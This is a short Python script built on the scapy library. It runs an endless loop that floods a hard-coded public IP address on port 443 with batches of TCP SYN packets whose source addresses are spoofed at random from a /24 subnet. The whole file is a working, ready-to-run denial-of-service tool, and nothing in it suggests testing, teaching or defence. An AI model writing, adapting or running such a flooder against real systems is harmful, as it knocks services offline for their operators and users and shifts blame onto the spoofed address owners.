from scapy.all import IP, TCP, send
import random
import ipaddress
import time

TARGET_IP = "95.46.154.20"
DST_PORT = 443
SRC_PORT = 53

# spoof edilecek subnet
network = ipaddress.IPv4Network("146.120.245.0/24")

BATCH_SIZE = 10000

def generate_packets():
    packets = []
    hosts = list(network.hosts())
    
    for _ in range(BATCH_SIZE):
        src_ip = str(random.choice(hosts))
        
        pkt = IP(src=src_ip, dst=TARGET_IP) / TCP(
            sport=SRC_PORT,
            dport=DST_PORT,
            flags="S"
        )
        
        packets.append(pkt)

    return packets


print("Continuous packet generator started...")

while True:
    packets = generate_packets()
    send(packets, inter=0, verbose=False)